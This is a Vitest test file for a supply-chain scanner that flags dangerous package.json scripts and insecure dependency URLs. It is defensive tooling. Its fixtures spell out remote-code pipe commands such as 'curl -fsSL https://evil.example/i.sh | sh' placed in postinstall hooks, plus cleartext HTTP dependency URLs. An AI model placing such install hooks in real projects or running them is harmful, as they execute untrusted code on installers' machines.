import { describe, it, expect } from "vitest"
import { supplyChainScanner } from "../../src/scanners/supply-chain"
import { makeContext } from "../helpers"

describe("supplyChainScanner", () => {
  it("flags a postinstall that pipes curl into sh", async () => {
    const ctx = makeContext({
      files: {
        "package.json": JSON.stringify({
          scripts: { postinstall: "curl -fsSL https://evil.example/i.sh | sh" },
        }),
      },
    })
    const issues = await supplyChainScanner.run(ctx)
    expect(issues).toHaveLength(1)
    expect(issues[0].severity).toBe("critical")
    expect(issues[0].id).toContain("lifecycle-remote-shell")
  })

  it("flags node -e in a lifecycle script as warning", async () => {
    const ctx = makeContext({
      files: {
        "package.json": JSON.stringify({
          scripts: { prepare: 'node -e "console.log(1)"' },
        }),
      },
    })
    const issues = await supplyChainScanner.run(ctx)
    expect(issues).toHaveLength(1)
    expect(issues[0].severity).toBe("warning")
    expect(issues[0].id).toContain("lifecycle-node-eval")
  })

  it("flags curl|sh in a non-lifecycle script as warning", async () => {
    const ctx = makeContext({
      files: {
        "package.json": JSON.stringify({
          scripts: { bootstrap: "wget -qO- https://x.example/a.sh | bash" },
        }),
      },
    })
    const issues = await supplyChainScanner.run(ctx)
    expect(issues).toHaveLength(1)
    expect(issues[0].severity).toBe("warning")
    expect(issues[0].id).toContain("scripts-curl-pipe")
  })

  it("flags cleartext HTTP dependency URLs", async () => {
    const ctx = makeContext({
      files: {
        "package.json": JSON.stringify({
          dependencies: { bad: "git+http://github.com/acme/bad.git" },
        }),
      },
    })
    const issues = await supplyChainScanner.run(ctx)
    expect(issues).toHaveLength(1)
    expect(issues[0].id).toContain("dep-git-http")
  })

  it("stays quiet on ordinary scripts and https deps", async () => {
    const ctx = makeContext({
      files: {
        "package.json": JSON.stringify({
          scripts: {
            predev: "pnpm build",
            test: "vitest run",
          },
          dependencies: {
            zod: "^4.0.0",
            good: "git+https://github.com/acme/good.git",
          },
        }),
      },
    })
    expect(await supplyChainScanner.run(ctx)).toHaveLength(0)
  })

  it("scans nested package.json files", async () => {
    const ctx = makeContext({
      files: {
        "package.json": JSON.stringify({ scripts: { test: "echo ok" } }),
        "packages/cli/package.json": JSON.stringify({
          scripts: { postinstall: "curl http://x | sh" },
        }),
      },
    })
    const issues = await supplyChainScanner.run(ctx)
    expect(issues).toHaveLength(1)
    expect(issues[0].location).toContain("packages/cli/package.json")
  })
})

describe("fixtures are not the project", () => {
  /**
   * Found by pointing the scanner at a directory laid out the way a security
   * tool lays one out. A malicious `package.json` under `test/__fixtures__/` is
   * sample data — the whole reason it exists is to be malicious — and reporting
   * it as the repository's own critical finding costs ten points for doing the
   * right thing. The people most likely to run this scanner are exactly the
   * people whose repositories contain such files.
   */
  it("ignores a manifest that only exists as test data", async () => {
    const malicious = JSON.stringify({
      scripts: { postinstall: "curl -sL http://evil.sh | sh" },
      dependencies: { thing: "http://cdn.example.com/thing.tgz" },
    })
    const ctx = makeContext({
      files: {
        "package.json": JSON.stringify({ name: "host" }),
        "test/__fixtures__/malicious/package.json": malicious,
        "packages/core/test/fixtures/bad/package.json": malicious,
        "examples/starter/package.json": malicious,
      },
    })
    expect(await supplyChainScanner.run(ctx)).toEqual([])
  })

  it("still reports the real manifest beside them", async () => {
    const ctx = makeContext({
      files: {
        "package.json": JSON.stringify({
          scripts: { postinstall: "curl -sL http://evil.sh | sh" },
        }),
        "test/__fixtures__/x/package.json": JSON.stringify({ name: "sample" }),
      },
    })
    const issues = await supplyChainScanner.run(ctx)
    expect(issues).toHaveLength(1)
    expect(issues[0].location).toBe("package.json#scripts.postinstall")
  })
})
